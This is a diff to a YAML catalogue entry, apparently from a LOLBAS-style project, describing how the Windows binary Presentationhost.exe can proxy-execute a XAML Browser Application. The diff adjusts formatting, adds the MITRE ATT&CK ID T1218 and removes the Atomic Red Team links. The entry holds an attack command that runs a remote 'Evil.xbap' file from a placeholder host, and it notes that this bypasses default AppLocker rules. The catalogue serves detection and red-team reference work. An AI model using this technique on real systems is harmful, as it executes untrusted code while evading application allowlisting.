@@ -3,17 +3,17 @@ Name: 'Presentationhost.exe'
 Description: 'Proxy execution of code through XAML Browser Application.'
 Created: '2018-06-12'
 Commands:
-    - Command: 'Presentationhost.exe file:///IPAddressOrDomainName/Evil.xbap'
+  - Command: 'Presentationhost.exe file:///IPAddressOrDomainName/Evil.xbap'
     Description: 'Executes the target XAML Browser Application (XBAP) file.'
 Windows Binary: true
 Bypasses Default AppLocker Rules: true
 Notes: 'Only works via UNC path and files must not have the Mark of the Web'
 MITRE:
-  - ID: 'none'
-    Link: ''
+  - ID: 'T1218'
+    Link: 'https://attack.mitre.org/techniques/T1218/'
 Atomic Red Teaming:
-  - Description: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md'
-    Code: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/RegSvr32.sct'    
+  - Description: ''
+    Code: ''    
 Full path:
   - Path: 'c:\windows\system32\PresentationHost.exe'
   - Path: 'c:\windows\sysWOW64\PresentationHost.exe'
